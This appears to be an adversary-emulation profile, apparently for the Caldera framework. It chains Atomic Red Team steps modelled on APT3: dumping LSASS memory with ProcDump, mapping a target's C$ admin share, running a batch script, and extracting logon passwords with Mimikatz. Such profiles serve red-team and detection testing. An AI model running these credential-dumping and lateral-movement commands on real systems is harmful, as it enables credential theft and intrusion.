adversary_id: custom_adversary_profile__APT_3__APT3_Phase2_Pattern_2__2023-10-19-22_35_24
name: Custom Adversary Profile
description: [['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__credential-access', 'atomic__credential-access'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__execution', 'atomic__execution']]
atomic_ordering:
- bd7780db67f42278033b765eb1c5de55 # ('bd7780db67f42278033b765eb1c5de55', 'None', 'None') ; {'description': 'The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.\n', 'tactic': 'credential-access', 'technique': {'attack_id': 'T1003.001', 'name': 'OS Credential Dumping: LSASS Memory'}, 'platforms': {'windows': {'cmd': {'cleanup': 'del "C:\\Windows\\Temp\\lsass_dump.dmp" >nul 2> nul', 'command': 'PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp', 'payloads': []}}}, 'id__dependence__fact': ['bd7780db67f42278033b765eb1c5de55', 'None', 'None'], 'plugin': 'atomic'}
- 6b96fa3cbc72bc6771572a924a31b15d # ('6b96fa3cbc72bc6771572a924a31b15d', 'None', 'validate_me') ; {'description': 'Map Admin share utilizing PowerShell\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['6b96fa3cbc72bc6771572a924a31b15d', 'None', 'validate_me'], 'plugin': 'atomic'}
- 91711bb1e9ad7268f211ad94afa4ccdb # ('91711bb1e9ad7268f211ad94afa4ccdb', 'None', 'validate_me') ; {'description': 'Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n', 'tactic': 'execution', 'technique': {'attack_id': 'T1059.003', 'name': 'Command and Scripting Interpreter: Windows Command Shell'}, 'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item $env:TEMP\\T1059.003_script.bat -Force -ErrorAction Ignore', 'command': 'Start-Process $env:TEMP\\T1059.003_script.bat', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['91711bb1e9ad7268f211ad94afa4ccdb', 'None', 'validate_me'], 'plugin': 'atomic'}
- 7ff61586e1037c4dfe877ce488fafe0f # ('7ff61586e1037c4dfe877ce488fafe0f', 'None', 'None') ; {'description': 'The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n', 'tactic': 'credential-access', 'technique': {'attack_id': 'T1003.001', 'name': 'OS Credential Dumping: LSASS Memory'}, 'platforms': {'windows': {'cmd': {'cleanup': '', 'command': 'PathToAtomicsFolder\\T1003.001\\bin\\mimikatz.exe "sekurlsa::minidump %tmp%\\lsass.DMP" "sekurlsa::logonpasswords full" exit', 'payloads': []}}}, 'id__dependence__fact': ['7ff61586e1037c4dfe877ce488fafe0f', 'None', 'None'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []